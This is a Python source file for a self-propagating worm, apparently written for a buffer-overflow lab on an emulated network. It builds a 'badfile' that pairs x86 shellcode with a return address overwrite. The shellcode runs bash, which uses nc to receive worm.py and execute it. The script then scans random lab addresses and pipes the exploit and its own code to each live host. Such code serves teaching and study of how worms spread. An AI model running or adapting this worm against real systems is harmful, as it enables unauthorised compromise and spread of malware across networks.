#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint
import socket

shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " if [ -e worm.py ]; then echo 'file exists here'; else      "
   " nc -lnv 7070 > worm.py; chmod +x worm.py; ./worm.py; fi   *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')

# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(517))
   ##################################################################
   # Put the shellcode at the end
   #content[517-len(shellcode):] = shellcode
   
   start=517-len(shellcode)
   content[start:start + len(shellcode)] = shellcode

   ret    = 0xffffd5f8 + 10  # Need to change
   offset = 112+4  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
def getNextTarget():
   x=randint(151,153)
   y=randint(71,73)
   z=randint(74,75)
   c=str(x)
   d=str(y)
   e=str(z)
   t=randint(0,1)
   if t == 0:
      f="10."+c+".0."+d
   else:
      f="10."+c+".0."+e
   return f

############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

parentIP=''

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()
    #targetIP = input("Enter your target machine IP: ")
    ipaddr=targetIP
    output = subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
    result = output.find(b'1 received')
    
    #Checking to make sure that the target is alive. 
    if result == -1:
       print(f"{ipaddr} is not alive", flush=True)
    else:
       print(f"*** {ipaddr} is alive, launch the attack", flush=True)
       
       parentIP=socket.gethostbyname(socket.gethostname());
       #print(f"IP Address of running computer is : {parentIP}", flush=True)
       
       #Checking if target host is the running host
       if parentIP == targetIP: 
          print(f"Target host {targetIP} is same as ParentIP", flush=True)
       else:
          # Send the malicious payload to the target host
          print(f"**********************************", flush=True)
          print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
          print(f"**********************************", flush=True)
          subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
          subprocess.run([f"cat worm.py | nc -w5 {targetIP} 7070"], shell=True)
       
          # Give the shellcode some time to run on the target host
          time.sleep(1)

          print(f">>>>> Attacking completed <<<<<", flush=True)
          print(f"**********************************", flush=True)
          
          # Sleep for 5 seconds before attacking another host
          #time.sleep(5) 

          #exit(0)
    
